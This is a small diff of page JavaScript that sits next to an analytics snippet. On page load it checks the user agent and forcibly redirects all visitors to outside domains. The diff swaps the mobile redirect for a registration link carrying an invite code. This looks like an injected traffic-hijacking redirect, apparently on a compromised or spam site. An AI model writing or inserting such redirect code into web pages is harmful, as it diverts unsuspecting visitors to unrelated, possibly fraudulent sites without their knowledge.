@@ -7,7 +7,7 @@ var _hmt = _hmt || [];
 })();
 
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	window.location.href="http://4139ky.com";
+	window.location.href="https://www.peirz.com:9519/entry/register/?i_code=73972416";
 }else{
 	window.location.href="http://4139ky.com";
 }
